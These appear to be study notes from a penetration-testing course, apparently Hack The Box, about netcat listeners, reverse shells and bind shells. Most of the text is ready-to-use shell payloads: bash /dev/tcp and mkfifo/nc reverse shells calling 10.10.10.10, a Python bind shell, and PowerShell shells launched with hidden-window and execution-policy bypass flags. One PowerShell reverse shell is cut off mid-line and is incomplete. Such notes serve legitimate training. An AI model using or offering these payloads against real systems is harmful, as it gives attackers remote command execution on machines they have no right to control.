# nc (netcat)

## Netcat Listener

The first step is to start a netcat listener on a port of our choosing:

    Netcat Listener
    MBWest@htb[/htb]$ nc -lvnp 1234

    listening on [any] 1234 ...
    
**The flags we are using are the following:**
| **Flag**   | **Description**   |
| --------------|-------------------|
| `-l` | Listen mode, to wait for a connection to connect to us |
| `-v` | Verbose mode, so that we know when we receive a connection |
| `-n` | Disable DNS resolution and only connect from/to IPs, to speed up the connection |
| `-p 1234` | Port number `netcat` is listening on, and the reverse connection should be sent to.
|

**Now that we have a `netcat` listener waiting for a connection, we can execute the reverse shell command that connects to us.**

## Reverse Shell

### Code: `bash`

    bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

### Code: `bash`

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

### Code: `powershell`

    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes =

## Bind Shell

### Code: `bash`

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

### Code: `python`

    python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

### Code: `powershell`

    powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

### Netcat Connection

**Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.**

**We can use `netcat` to connect to that port and get a connection to the shell:**

    MBWest@htb[/htb]$ nc 10.10.10.1 1234
